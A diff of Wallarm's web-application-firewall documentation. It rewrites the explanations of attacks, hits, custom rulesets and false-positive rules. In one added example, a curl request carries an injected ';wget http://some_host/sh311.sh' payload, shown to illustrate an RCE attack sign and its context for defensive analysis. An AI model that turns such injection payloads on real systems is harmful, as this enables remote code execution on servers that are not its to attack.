@@ -1,4 +1,4 @@
-[rule-creation-options]:            ../user-guides/events/check-attack.md#attack-analysis_1
+[rule-creation-options]:            ../user-guides/events/check-attack.md#responding-to-attacks
 [request-processing]:               ../user-guides/rules/request-processing.md
 [api-discovery-enable-link]:        ../api-discovery/setup.md
 [ip-lists-link]:                    ../user-guides/ip-lists/overview.md
@@ -18,26 +18,9 @@ The Wallarm platform continuously analyzes API traffic and mitigates malicious r
 
 ## What is attack and what are attack components?
 
-<div>
-  <script async src="https://js.storylane.io/js/v2/storylane.js"></script>
-  <div class="sl-embed" style="position:relative;padding-bottom:calc(61.18% + 25px);width:100%;height:0;transform:scale(1)">
-    <iframe loading="lazy" class="sl-demo" src="https://wallarm.storylane.io/demo/pmaofaxiwniz?embed=inline" name="sl-embed" allow="fullscreen" allowfullscreen style="position:absolute;top:0;left:0;width:100%!important;height:100%!important;border:1px solid rgba(63,95,172,0.35);box-shadow: 0px 0px 18px rgba(26, 19, 72, 0.15);border-radius:10px;box-sizing:border-box;"></iframe>
-  </div>
-</div>
+<a name="attack"></a>**Attack** is a single hit or multiple hits grouped by the same attack type, the parameter with the malicious payload, and the address the hits were sent to. Hits may come from the same or different IP addresses and have different values of the malicious payloads within one attack type. A new hit should arrive within an hour from the last - otherwise it will go to a separate attack.
 
-<a name="attack"></a>**Attack** is a single hit or multiple hits grouped by the following characteristics:
-
-* The same attack type, the parameter with the malicious payload, and the address the hits were sent to. Hits may come from the same or different IP addresses and have different values of the malicious payloads within one attack type. A new hit should arrive within an hour from the last - otherwise it will go to a separate attack.
-
-    This hit grouping method is basic and applied to all hits.
-
-* The same source IP address if [grouping of hits by source IP](../user-guides/events/grouping-sampling.md#grouping-of-hits) is enabled. Other hit parameter values can differ.
-
-    This hit grouping method works for all hits except for the ones of the Brute force, Forced browsing, BOLA (IDOR), Resource overlimit, Data bomb and Virtual patch attack types.
-
-    If hits are grouped by this method, the [**Mark as false positive**](../user-guides/events/check-attack.md#false-positives) button is unavailable for the attack.
-
-The listed hit grouping methods do not exclude each other. If hits have characteristics of both methods, they are all grouped into one attack.
+This hit grouping is applied to all hits. In Wallarm Console, you can additionally regroup attacks for display with the **Group by** control - see [Attack Search and Filters](../user-guides/search-and-filters/attack-filters.md#grouping).
 
 <a name="hit"></a>**Hit** is a serialized malicious request (original malicious request and metadata added by the Wallarm node). If Wallarm detects several malicious payloads of different types in one request, Wallarm records several hits with payloads of one type in each.
 
@@ -47,6 +30,16 @@ The listed hit grouping methods do not exclude each other. If hits have characte
 * Context of the attack sign. Context is a set of symbols preceding and closing detected attack signs. Since a payload length is limited, the context can be omitted if an attack sign is of full payload length.
 
     Since attack signs are not used to detect [behavioral attacks](../attacks-vulns-list.md#attack-types), requests sent as a part of behavioral attacks have empty payloads.
+
+For example, in this request:
+
+```bash
+curl localhost/?23036d6ba7=%3Bwget+http%3A%2F%2Fsome_host%2Fsh311.sh
+```
+
+the malicious payload is `;wget http://some_host/sh311.sh`, where `;wget+` is the [RCE](../attacks-vulns-list.md#remote-code-execution-rce) attack sign and the rest is its context.
+
+![Attack components in Wallarm Console](../images/user-guides/events/attack-components.png)
 
 [Learn how to analyze attacks in Wallarm →](../user-guides/events/check-attack.md)
 
@@ -94,7 +87,9 @@ Wallarm additionally validates SQL injection attacks (**libdetection** library, 
 
 ### Custom rules
 
-Custom [rules](../user-guides/rules/rules.md) are used to fine-tune the behavior defined by basic set of detectors. Users create them in Wallarm Console and the set of them is uploaded to the filtering node.
+Custom [rules](../user-guides/rules/rules.md) fine-tune the behavior defined by the basic set of detectors — for example, they mask sensitive data before it is uploaded to the Wallarm Cloud, add regexp-based attack indicators, apply a virtual patch against an active vulnerability, or disable attack detection in specific requests. You create them in Wallarm Console.
+
+Together with [mitigation controls](#mitigation-controls), your custom rules are compiled into a **custom ruleset** (formerly LOM) that Wallarm nodes download from the Wallarm Cloud and rely on during request analysis. The ruleset is never empty: by default it already contains the rules created for the account, such as the [filtration mode](../admin-en/configure-wallarm-mode.md#general-filtration-mode) rule. Changes to rules or mitigation controls take effect only after the ruleset is [rebuilt and uploaded](../user-guides/rules/rules.md#ruleset-lifecycle) to the node.
 
 ### Mitigation controls
 
@@ -214,33 +209,12 @@ When analyzing requests for attacks, Wallarm uses the standard ruleset that prov
 
 In such cases, standard rules need to be adjusted to accommodate protected API specificities by using the following methods:
 
-* Analyze potential false positives (by filtering all attacks by the [tag `!known`](../user-guides/search-and-filters/use-search.md#search-by-known-attacks-cve-and-wellknown-exploits)) and if confirming false positives, [mark](../user-guides/events/check-attack.md#false-positives) particular attacks or hits appropriately. Wallarm will automatically create the rules disabling analysis of the same requests for detected attack signs.
+* Analyze potential false positives and, if confirming them, [mark](../user-guides/events/check-attack.md#false-positives) the attacks or requests as false positives to clean up the attack data, then create a [false-positive rule](../user-guides/events/check-attack.md#false-positives) to stop detecting the same requests.
 * [Disable detection of certain attack types](../about-wallarm/protecting-against-attacks.md#ignoring-certain-attack-types) in particular requests.
 * [Disable detection of certain attack signs in binary data](../about-wallarm/protecting-against-attacks.md#ignoring-certain-attack-signs-in-the-binary-data).
 * [Disable parsers mistakenly applied to the requests](../user-guides/rules/request-processing.md#managing-parsers).
 
-Identifying and handling false positives is a part of Wallarm fine‑tuning to protect your APIs. We recommend deploying the first Wallarm node in the monitoring [mode](#monitoring-and-blocking-attacks) and analyzing detected attacks. If some requests are mistakenly recognized as attacks, mark them as false positives and switch the filtering node to blocking mode.
-
-<a name="false-positive-safe"></a>**What happens when you mark an attack or incident as a false positive?**
-
-When pressing a **False** button, Wallarm creates a hidden rule that turns off the detection for the similar attack, that has:
-
-* The same target host
-* The same endpoint (path)
-* The same attacked parameter (point)
-* The similar payload (**stamp**)
-
-About **stamps**: in Wallarm's terminology, "[stamp](../about-wallarm/waap-overview.md#protection-measures)" is a specific variation of attack (specific state of different attributes defining the attack). For each [attack type](../attacks-vulns-list.md), there is a sufficient number of stamps. This makes pressing the **False** button safe, since only literally 1 of about 30 checks for a specific attack type is disabled exclusively.
-
-Moreover, as mentioned above, this check is disabled only for particular endpoint/parameter, and not for others. Result: if you click **False** for `example.com/books` → `title` parameter, SQLi attack of stamp `A(1)-B(1)-C(2)`:
-
-* Further requests to `example.com/books`, having `A(1)-B(1)-C(2)` in the `title` parameter, will not be considered to be an SQLi attack.
-* Further requests to `example.com/books`, having `A(3)-B(1)` (or any other SQLi stamp) in the `title` parameter will still be considered an SQLi attack.
-* Further requests to any other parameter of `example.com/books` are not affected.
-* Further requests to any other endpoint are not affected.
-
-!!! info "It is about payload, not IPs"
-    Marking some attack as false positive does not disable the attack detection for the particular source IP, target URL, JSON-key or XML-tag.
+Identifying and handling false positives is a part of Wallarm fine‑tuning to protect your APIs. We recommend deploying the first Wallarm node in the monitoring [mode](#monitoring-and-blocking-attacks) and analyzing detected attacks. If some requests are mistakenly recognized as attacks, create false-positive rules for them, then switch the filtering node to blocking mode.
 
 ## Attacks in Wallarm UI
 
@@ -248,7 +222,7 @@ Wallarm provides you with the comprehensive user interface displaying all detect
 
 See details in the [Attack Analysis](../user-guides/events/check-attack.md) article.
 
-![Attacks view](../images/user-guides/events/check-attack.png)
+![Attacks view](../images/user-guides/events/attacks-page.png)
 
 <!-- ## Demo videos
 
